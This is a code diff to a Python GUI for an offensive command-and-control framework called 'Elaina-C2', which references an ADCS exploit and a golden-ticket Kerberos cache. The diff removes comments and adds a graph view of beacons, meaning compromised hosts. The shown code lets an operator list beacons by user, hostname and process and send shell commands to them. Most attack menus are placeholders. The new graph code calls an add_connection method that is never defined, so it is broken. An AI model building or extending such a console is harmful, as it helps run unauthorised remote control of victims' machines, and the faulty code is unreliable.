@@ -30,7 +30,6 @@ import getpass
 from datetime import datetime, timedelta
 from functools import wraps
 from collections import defaultdict
-
 import requests
 import cloudscraper
 from bs4 import BeautifulSoup
@@ -69,11 +68,9 @@ from cryptography.hazmat.primitives import hashes
 from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.primitives.asymmetric import rsa, padding
-
 warnings.filterwarnings("ignore", message="Unverified HTTPS request")
 init(autoreset=True)
 
-# PyQt5 imports
 from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QHBoxLayout, 
                             QTabWidget, QTableWidget, QTableWidgetItem, QHeaderView, 
                             QPushButton, QGroupBox, QTextEdit, QLabel, QSplitter, 
@@ -82,14 +79,15 @@ from PyQt5.QtWidgets import (QApplication, QMainWindow, QWidget, QVBoxLayout, QH
                             QScrollArea, QFrame, QStatusBar, QSystemTrayIcon, QStyle,
                             QToolBar, QComboBox, QSpinBox, QCheckBox, QRadioButton,
                             QButtonGroup, QListWidget, QListWidgetItem, QProgressBar,
-                            QInputDialog, QAbstractItemView)
-from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice
-from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices
+                            QInputDialog, QAbstractItemView, QTreeWidget, QTreeWidgetItem,
+                            QGraphicsView, QGraphicsScene, QGraphicsItem, QGraphicsEllipseItem,
+                            QGraphicsLineItem, QGraphicsTextItem, QGridLayout, QSizePolicy)
+from PyQt5.QtCore import Qt, pyqtSignal, QTimer, QThread, QSize, QUrl, QMimeData, QBuffer, QIODevice, QPoint, QRect, QPointF
+from PyQt5.QtGui import QIcon, QFont, QPixmap, QImage, QTextCharFormat, QColor, QClipboard, QDrag, QDesktopServices, QPainter, QPen, QBrush
 from PyQt5.QtWebEngineWidgets import QWebEngineView
 from PyQt5.QtWebChannel import QWebChannel
 from PyQt5.QtWebSockets import QWebSocketServer
 
-# Global constants
 LOG_JSON_PATH = "elaina_ultimate_log.json"
 COOKIE_PATH = "elaina_ultimate_cookies.txt"
 LOG_JSON_FILE = "adcs_exploit_log.json"
@@ -97,14 +95,12 @@ CCACHE_PATH = "golden_ticket.ccache"
 C2_CONFIG_PATH = "c2_config.json"
 BEACON_CONFIG_PATH = "beacon_config.bin"
 
-# Logging setup
-logger = logging.getLogger("ADCSExploit")
+logger = logging.getLogger("Elaina-C2")
 logger.setLevel(logging.DEBUG)
 console_handler = logging.StreamHandler()
 console_format = logging.Formatter("\033[1;32m%(asctime)s\033[0m [\033[1;34m%(levelname)s\033[0m] \033[1;33m%(module)s\033[0m: %(message)s", datefmt="%H:%M:%S")
 console_handler.setFormatter(console_format)
 logger.addHandler(console_handler)
-
 log_entries = []
 
 def log(action, target, status, detail=None):
@@ -144,7 +140,6 @@ def colorize(text, color_code):
     return f"\033[{color_code}m{text}\033[0m"
 
 def random_string(length=8):
-    """Generate a random string"""
     return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))
 
 class AdvancedEncryption:
@@ -1339,6 +1334,77 @@ class OutputDisplayWidget(QWidget):
             print(f"Error saving output: {str(e)}")
             return False
 
+class BeaconNode(QGraphicsEllipseItem):
+    def __init__(self, beacon_id, beacon_info, x, y, radius=30):
+        super().__init__(0, 0, radius*2, radius*2)
+        self.beacon_id = beacon_id
+        self.beacon_info = beacon_info
+        self.setPos(x, y)
+        self.setBrush(QBrush(QColor(100, 200, 100)))
+        self.setPen(QPen(Qt.black, 2))
+        
+        self.text = QGraphicsTextItem(beacon_id, self)
+        text_width = self.text.boundingRect().width()
+        self.text.setPos(x - text_width/2, y + radius + 5)
+        
+        self.setFlag(QGraphicsItem.ItemIsMovable)
+        self.setFlag(QGraphicsItem.ItemIsSelectable)
+        
+    def get_beacon_id(self):
+        return self.beacon_id
+        
+    def get_beacon_info(self):
+        return self.beacon_info
+
+class BeaconConnection(QGraphicsLineItem):
+    def __init__(self, source_node, dest_node):
+        super().__init__()
+        self.source = source_node
+        self.dest = dest_node
+        self.source.add_connection(self)
+        self.dest.add_connection(self)
+        self.update_position()
+        
+    def update_position(self):
+        source_pos = self.source.scenePos()
+        dest_pos = self.dest.scenePos()
+        self.setLine(source_pos.x(), source_pos.y(), dest_pos.x(), dest_pos.y())
+
+class BeaconGraphicsView(QGraphicsView):
+    def __init__(self, parent=None):
+        super().__init__(parent)
+        self.scene = QGraphicsScene(self)
+        self.setScene(self.scene)
+        self.setRenderHint(QPainter.Antialiasing)
+        self.nodes = {}
+        self.connections = []
+        
+    def add_beacon(self, beacon_id, beacon_info):
+        x = random.randint(50, 750)
+        y = random.randint(50, 550)
+        node = BeaconNode(beacon_id, beacon_info, x, y)
+        self.scene.addItem(node)
+        self.nodes[beacon_id] = node
+        
+    def remove_beacon(self, beacon_id):
+        if beacon_id in self.nodes:
+            node = self.nodes[beacon_id]
+            self.scene.removeItem(node)
+            del self.nodes[beacon_id]
+            
+    def connect_beacons(self, source_id, dest_id):
+        if source_id in self.nodes and dest_id in self.nodes:
+            source_node = self.nodes[source_id]
+            dest_node = self.nodes[dest_id]
+            connection = BeaconConnection(source_node, dest_node)
+            self.scene.addItem(connection)
+            self.connections.append(connection)
+            
+    def clear_all(self):
+        self.scene.clear()
+        self.nodes = {}
+        self.connections = []
+
 class EnhancedBeaconInteractDialog(QDialog):
     command_sent = pyqtSignal(str, str)
     
@@ -1622,21 +1688,15 @@ class ElainaMainWindow(QMainWindow):
         self.setMinimumSize(1200, 800)
         self.setWindowIcon(QIcon.fromTheme("network-wired"))
         
-        # Create central widget and main layout
         central_widget = QWidget()
         main_layout = QVBoxLayout(central_widget)
         
-        # Create menu bar
         self.create_menu_bar()
-        
-        # Create toolbar
         self.create_toolbar()
         
-        # Create tab widget
         self.tab_widget = QTabWidget()
         main_layout.addWidget(self.tab_widget)
         
-        # Create tabs
         self.create_dashboard_tab()
         self.create_beacons_tab()
         self.create_attacks_tab()
@@ -1645,23 +1705,18 @@ class ElainaMainWindow(QMainWindow):
         self.create_scripts_tab()
         self.create_view_tab()
         
-        # Create status bar
         self.status_bar = QStatusBar()
         self.setStatusBar(self.status_bar)
         self.status_bar.showMessage("Ready")
         
         self.setCentralWidget(central_widget)
         
-        # Setup system tray
         self.setup_system_tray()
-        
-        # Setup timers
         self.setup_timers()
         
     def create_menu_bar(self):
         menubar = self.menuBar()
         
-        # File menu
         file_menu = menubar.addMenu("File")
         
         new_action = QAction("New", self)
@@ -1683,7 +1738,6 @@ class ElainaMainWindow(QMainWindow):
         exit_action.triggered.connect(self.close)
         file_menu.addAction(exit_action)
         
-        # Edit menu
         edit_menu = menubar.addMenu("Edit")
         
         copy_action = QAction("Copy", self)
@@ -1694,7 +1748,6 @@ class ElainaMainWindow(QMainWindow):
         paste_action.setShortcut("Ctrl+V")
         edit_menu.addAction(paste_action)
         
-        # View menu
         view_menu = menubar.addMenu("View")
         
         dashboard_action = QAction("Dashboard", self)
@@ -1709,7 +1762,6 @@ class ElainaMainWindow(QMainWindow):
         attacks_action.triggered.connect(lambda: self.tab_widget.setCurrentIndex(2))
         view_menu.addAction(attacks_action)
         
-        # Attacks menu
         attacks_menu = menubar.addMenu("Attacks")
         
         web_attack_action = QAction("Web Attack", self)
@@ -1721,7 +1773,6 @@ class ElainaMainWindow(QMainWindow):
         generate_payload_action = QAction("Generate Payload", self)
         attacks_menu.addAction(generate_payload_action)
         
-        # Help menu
         help_menu = menubar.addMenu("Help")
         
         about_action = QAction("About", self)
@@ -1760,7 +1811,6 @@ class ElainaMainWindow(QMainWindow):
         dashboard_widget = QWidget()
         layout = QVBoxLayout(dashboard_widget)
         
-        # Create summary widgets
         summary_layout = QHBoxLayout()
         
         beacons_group = QGroupBox("Beacons")
@@ -1792,7 +1842,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addLayout(summary_layout)
         
-        # Create recent activity
         recent_activity_group = QGroupBox("Recent Activity")
         recent_activity_layout = QVBoxLayout(recent_activity_group)
         
@@ -1807,7 +1856,29 @@ class ElainaMainWindow(QMainWindow):
         beacons_widget = QWidget()
         layout = QVBoxLayout(beacons_widget)
         
-        # Create beacons table
+        view_toggle_layout = QHBoxLayout()
+        
+        self.view_toggle_group = QButtonGroup()
+        
+        table_view_button = QRadioButton("Table View")
+        table_view_button.setChecked(True)
+        self.view_toggle_group.addButton(table_view_button, 0)
+        view_toggle_layout.addWidget(table_view_button)
+        
+        graph_view_button = QRadioButton("Graph View")
+        self.view_toggle_group.addButton(graph_view_button, 1)
+        view_toggle_layout.addWidget(graph_view_button)
+        
+        view_toggle_layout.addStretch()
+        
+        layout.addLayout(view_toggle_layout)
+        
+        self.beacons_stack = QStackedWidget()
+        layout.addWidget(self.beacons_stack)
+        
+        self.beacons_table_widget = QWidget()
+        table_layout = QVBoxLayout(self.beacons_table_widget)
+        
         self.beacons_table = QTableWidget()
         self.beacons_table.setColumnCount(7)
         self.beacons_table.setHorizontalHeaderLabels(["ID", "Internal IP", "User", "Hostname", "OS", "Process", "Last Checkin"])
@@ -1816,9 +1887,8 @@ class ElainaMainWindow(QMainWindow):
         self.beacons_table.setEditTriggers(QTableWidget.NoEditTriggers)
         self.beacons_table.setAlternatingRowColors(True)
         self.beacons_table.setSortingEnabled(True)
-        layout.addWidget(self.beacons_table)
+        table_layout.addWidget(self.beacons_table)
         
-        # Create buttons
         buttons_layout = QHBoxLayout()
         
         interact_button = QPushButton("Interact")
@@ -1831,9 +1901,8 @@ class ElainaMainWindow(QMainWindow):
         
         buttons_layout.addStretch()
         
-        layout.addLayout(buttons_layout)
+        table_layout.addLayout(buttons_layout)
         
-        # Create beacon output
         beacon_output_group = QGroupBox("Beacon Output")
         beacon_output_layout = QVBoxLayout(beacon_output_group)
         
@@ -1842,15 +1911,50 @@ class ElainaMainWindow(QMainWindow):
         self.beacon_output.setFont(QFont("Consolas", 10))
         beacon_output_layout.addWidget(self.beacon_output)
         
-        layout.addWidget(beacon_output_group)
+        table_layout.addWidget(beacon_output_group)
+        
+        self.beacons_stack.addWidget(self.beacons_table_widget)
+        
+        self.beacons_graph_widget = QWidget()
+        graph_layout = QVBoxLayout(self.beacons_graph_widget)
+        
+        self.beacons_graph_view = BeaconGraphicsView()
+        graph_layout.addWidget(self.beacons_graph_view)
+        
+        graph_buttons_layout = QHBoxLayout()
+        
+        graph_interact_button = QPushButton("Interact")
+        graph_interact_button.clicked.connect(self.interact_with_beacon)
+        graph_buttons_layout.addWidget(graph_interact_button)
+        
+        graph_remove_button = QPushButton("Remove")
+        graph_remove_button.clicked.connect(self.remove_beacon)
+        graph_buttons_layout.addWidget(graph_remove_button)
+        
+        graph_buttons_layout.addStretch()
+        
+        graph_layout.addLayout(graph_buttons_layout)
+        
+        self.beacons_stack.addWidget(self.beacons_graph_widget)
+        
+        self.view_toggle_group.buttonClicked.connect(self.toggle_beacons_view)
         
         self.tab_widget.addTab(beacons_widget, "Beacons")
         
+    def toggle_beacons_view(self, button_id):
+        self.beacons_stack.setCurrentIndex(button_id)
+        if button_id == 1:  # Graph view
+            self.update_beacons_graph()
+            
+    def update_beacons_graph(self):
+        self.beacons_graph_view.clear_all()
+        for beacon_id, beacon_info in self.beacons.items():
+            self.beacons_graph_view.add_beacon(beacon_id, beacon_info)
+            
     def create_attacks_tab(self):
         attacks_widget = QWidget()
         layout = QVBoxLayout(attacks_widget)
         
-        # Create attacks table
         self.attacks_table = QTableWidget()
         self.attacks_table.setColumnCount(5)
         self.attacks_table.setHorizontalHeaderLabels(["ID", "Type", "Target", "Status", "Start Time"])
@@ -1861,7 +1965,6 @@ class ElainaMainWindow(QMainWindow):
         self.attacks_table.setSortingEnabled(True)
         layout.addWidget(self.attacks_table)
         
-        # Create buttons
         buttons_layout = QHBoxLayout()
         
         new_attack_button = QPushButton("New Attack")
@@ -1876,7 +1979,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addLayout(buttons_layout)
         
-        # Create attack output
         attack_output_group = QGroupBox("Attack Output")
         attack_output_layout = QVBoxLayout(attack_output_group)
         
@@ -1893,7 +1995,6 @@ class ElainaMainWindow(QMainWindow):
         c2_widget = QWidget()
         layout = QVBoxLayout(c2_widget)
         
-        # Create C2 configuration
         c2_config_group = QGroupBox("C2 Configuration")
         c2_config_layout = QFormLayout(c2_config_group)
         
@@ -1918,7 +2019,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addWidget(c2_config_group)
         
-        # Create C2 status
         c2_status_group = QGroupBox("C2 Status")
         c2_status_layout = QVBoxLayout(c2_status_group)
         
@@ -1929,7 +2029,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addWidget(c2_status_group)
         
-        # Create C2 buttons
         c2_buttons_layout = QHBoxLayout()
         
         self.start_c2_button = QPushButton("Start C2 Server")
@@ -1945,7 +2044,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addLayout(c2_buttons_layout)
         
-        # Create C2 output
         c2_output_group = QGroupBox("C2 Output")
         c2_output_layout = QVBoxLayout(c2_output_group)
         
@@ -1962,7 +2060,6 @@ class ElainaMainWindow(QMainWindow):
         listener_widget = QWidget()
         layout = QVBoxLayout(listener_widget)
         
-        # Create listener configuration
         listener_config_group = QGroupBox("Listener Configuration")
         listener_config_layout = QFormLayout(listener_config_group)
         
@@ -1988,7 +2085,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addWidget(listener_config_group)
         
-        # Create listener buttons
         listener_buttons_layout = QHBoxLayout()
         
         self.add_listener_button = QPushButton("Add Listener")
@@ -2003,7 +2099,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addLayout(listener_buttons_layout)
         
-        # Create listeners table
         self.listeners_table = QTableWidget()
         self.listeners_table.setColumnCount(5)
         self.listeners_table.setHorizontalHeaderLabels(["Name", "Type", "Host", "Port", "Status"])
@@ -2020,7 +2115,6 @@ class ElainaMainWindow(QMainWindow):
         scripts_widget = QWidget()
         layout = QVBoxLayout(scripts_widget)
         
-        # Create scripts list
         scripts_list_group = QGroupBox("Scripts")
         scripts_list_layout = QVBoxLayout(scripts_list_group)
         
@@ -2030,7 +2124,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addWidget(scripts_list_group)
         
-        # Create script editor
         script_editor_group = QGroupBox("Script Editor")
         script_editor_layout = QVBoxLayout(script_editor_group)
         
@@ -2040,7 +2133,6 @@ class ElainaMainWindow(QMainWindow):
         
         layout.addWidget(script_editor_group)
         
-        # Create script buttons
         script_buttons_layout = QHBoxLayout()
         
         self.new_script_button = QPushButton("New")
@@ -2069,11 +2161,9 @@ class ElainaMainWindow(QMainWindow):
         view_widget = QWidget()
         layout = QVBoxLayout(view_widget)
         
-        # Create web view
         self.web_view = QWebEngineView()
         layout.addWidget(self.web_view)
         
-        # Create navigation bar
         nav_layout = QHBoxLayout()
         
         self.back_button = QPushButton("Back")
@@ -2124,42 +2214,32 @@ class ElainaMainWindow(QMainWindow):
         self.tray_icon.show()
         
     def setup_timers(self):
-        # Timer for updating dashboard
         self.dashboard_timer = QTimer(self)
         self.dashboard_timer.timeout.connect(self.update_dashboard)
-        self.dashboard_timer.start(5000)  # Update every 5 seconds
+        self.dashboard_timer.start(5000)
         
-        # Timer for updating beacons
         self.beacons_timer = QTimer(self)
         self.beacons_timer.timeout.connect(self.update_beacons)
-        self.beacons_timer.start(2000)  # Update every 2 seconds
+        self.beacons_timer.start(2000)
         
-        # Timer for updating attacks
         self.attacks_timer = QTimer(self)
         self.attacks_timer.timeout.connect(self.update_attacks)
-        self.attacks_timer.start(3000)  # Update every 3 seconds
+        self.attacks_timer.start(3000)
         
     def update_dashboard(self):
-        # Update beacons count
         self.beacons_count_label.setText(str(len(self.beacons)))
-        
-        # Update targets count (placeholder)
         self.targets_count_label.setText(str(len(self.beacons)))
-        
-        # Update attacks count (placeholder)
         self.attacks_count_label.setText("0")
         
-        # Update recent activity
         if len(self.log_entries) > 0:
             self.recent_activity_list.clear()
-            for entry in self.log_entries[-10:]:  # Show last 10 entries
+            for entry in self.log_entries[-10:]:
                 item_text = f"[{entry['time']}] {entry['action']} {entry['target']} {entry['status']}"
                 if entry.get('detail'):
                     item_text += f" - {entry['detail']}"
                 self.recent_activity_list.addItem(item_text)
         
     def update_beacons(self):
-        # Update beacons table
         self.beacons_table.setRowCount(len(self.beacons))
         
         row = 0
@@ -2181,11 +2261,9 @@ class ElainaMainWindow(QMainWindow):
             
             row += 1
         
-        # Resize columns to content
         self.beacons_table.resizeColumnsToContents()
         
     def update_attacks(self):
-        # Placeholder for updating attacks table
         pass
         
     def interact_with_beacon(self):
@@ -2203,10 +2281,8 @@ class ElainaMainWindow(QMainWindow):
         
     def send_beacon_command(self, beacon_id, command):
         if self.c2_server and beacon_id in self.c2_server.clients:
-            # Add task to C2 server
             task_id = self.c2_server.add_task(beacon_id, "shell", command)
             
-            # Add to log
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "action": "command",
@@ -2215,17 +2291,14 @@ class ElainaMainWindow(QMainWindow):
                 "detail": command
             })
             
-            # Update beacon output
             timestamp = datetime.now().strftime('%H:%M:%S')
             self.beacon_output.append(f"[{timestamp}] > {command}")
             
-            # Update status bar
             self.status_bar.showMessage(f"Command sent to beacon {beacon_id}")
         else:
             QMessageBox.warning(self, "Error", f"Beacon {beacon_id} not connected or C2 server not running.")
             
     def add_beacon_result(self, beacon_id, result):
-        # Update beacon output
         timestamp = datetime.now().strftime('%H:%M:%S')
         
         if "stdout" in result and result["stdout"]:
@@ -2234,7 +2307,6 @@ class ElainaMainWindow(QMainWindow):
         if "stderr" in result and result["stderr"]:
             self.beacon_output.append(f"[{timestamp}] {result['stderr']}")
         
-        # Add to log
         self.log_entries.append({
             "time": timestamp,
             "action": "result",
@@ -2260,7 +2332,6 @@ class ElainaMainWindow(QMainWindow):
             if beacon_id in self.beacons:
                 del self.beacons[beacon_id]
                 
-                # Add to log
                 self.log_entries.append({
                     "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "action": "remove",
@@ -2268,15 +2339,12 @@ class ElainaMainWindow(QMainWindow):
                     "status": "success"
                 })
                 
-                # Update status bar
                 self.status_bar.showMessage(f"Beacon {beacon_id} removed")
                 
     def new_attack(self):
-        # Placeholder for new attack dialog
         QMessageBox.information(self, "New Attack", "New attack functionality not implemented yet.")
         
     def stop_attack(self):
-        # Placeholder for stop attack functionality
         QMessageBox.information(self, "Stop Attack", "Stop attack functionality not implemented yet.")
         
     def start_c2_server(self):
@@ -2295,7 +2363,6 @@ class ElainaMainWindow(QMainWindow):
             self.start_c2_button.setEnabled(False)
             self.stop_c2_button.setEnabled(True)
             
-            # Add to log
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "action": "start_c2",
@@ -2303,16 +2370,13 @@ class ElainaMainWindow(QMainWindow):
                 "status": "success"
             })
             
-            # Update status bar
             self.status_bar.showMessage(f"C2 server started on {host}:{port}")
             
-            # Add to C2 output
             self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server started on {host}:{port}")
         else:
             self.c2_status_label.setText("Failed to Start")
             self.c2_status_label.setStyleSheet("font-size: 18px; font-weight: bold; color: red;")
             
-            # Add to log
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "action": "start_c2",
@@ -2320,10 +2384,8 @@ class ElainaMainWindow(QMainWindow):
                 "status": "failed"
             })
             
-            # Update status bar
             self.status_bar.showMessage("Failed to start C2 server")
             
-            # Add to C2 output
             self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] Failed to start C2 server on {host}:{port}")
             
     def stop_c2_server(self):
@@ -2337,7 +2399,6 @@ class ElainaMainWindow(QMainWindow):
             self.start_c2_button.setEnabled(True)
             self.stop_c2_button.setEnabled(False)
             
-            # Add to log
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "action": "stop_c2",
@@ -2345,22 +2406,17 @@ class ElainaMainWindow(QMainWindow):
                 "status": "success"
             })
             
-            # Update status bar
             self.status_bar.showMessage("C2 server stopped")
             
-            # Add to C2 output
             self.c2_output.append(f"[{datetime.now().strftime('%H:%M:%S')}] C2 server stopped")
             
     def generate_beacon(self):
-        # Placeholder for beacon generation dialog
         QMessageBox.information(self, "Generate Beacon", "Beacon generation functionality not implemented yet.")
         
     def add_listener(self):
-        # Placeholder for add listener functionality
         QMessageBox.information(self, "Add Listener", "Add listener functionality not implemented yet.")
         
     def remove_listener(self):
-        # Placeholder for remove listener functionality
         QMessageBox.information(self, "Remove Listener", "Remove listener functionality not implemented yet.")
         
     def new_script(self):
@@ -2373,7 +2429,6 @@ class ElainaMainWindow(QMainWindow):
                 with open(file_path, 'w') as f:
                     f.write(self.script_editor.toPlainText())
                 
-                # Add to log
                 self.log_entries.append({
                     "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "action": "save_script",
@@ -2381,7 +2436,6 @@ class ElainaMainWindow(QMainWindow):
                     "status": "success"
                 })
                 
-                # Update status bar
                 self.status_bar.showMessage(f"Script saved to {file_path}")
             except Exception as e:
                 QMessageBox.critical(self, "Error", f"Failed to save script: {str(e)}")
@@ -2393,7 +2447,6 @@ class ElainaMainWindow(QMainWindow):
                 with open(file_path, 'r') as f:
                     self.script_editor.setPlainText(f.read())
                 
-                # Add to log
                 self.log_entries.append({
                     "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                     "action": "load_script",
@@ -2401,13 +2454,11 @@ class ElainaMainWindow(QMainWindow):
                     "status": "success"
                 })
                 
-                # Update status bar
                 self.status_bar.showMessage(f"Script loaded from {file_path}")
             except Exception as e:
                 QMessageBox.critical(self, "Error", f"Failed to load script: {str(e)}")
                 
     def execute_script(self):
-        # Placeholder for script execution functionality
         QMessageBox.information(self, "Execute Script", "Script execution functionality not implemented yet.")
         
     def navigate_to_url(self):
@@ -2418,7 +2469,6 @@ class ElainaMainWindow(QMainWindow):
             
             self.web_view.setUrl(QUrl(url))
             
-            # Add to log
             self.log_entries.append({
                 "time": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
                 "action": "navigate",
@@ -2426,7 +2476,6 @@ class ElainaMainWindow(QMainWindow):
                 "status": "success"
             })
             
-            # Update status bar
             self.status_bar.showMessage(f"Navigated to {url}")
 
 class EnhancedElainaMainWindow(ElainaMainWindow):
@@ -2436,7 +2485,6 @@ class EnhancedElainaMainWindow(ElainaMainWindow):
         self.init_enhanced_ui()
         
     def init_enhanced_ui(self):
-        # Replace the beacon output area with enhanced output display
         for i in range(self.tab_widget.count()):
             if self.tab_widget.tabText(i) == "Beacons":
                 beacons_widget = self.tab_widget.widget(i)
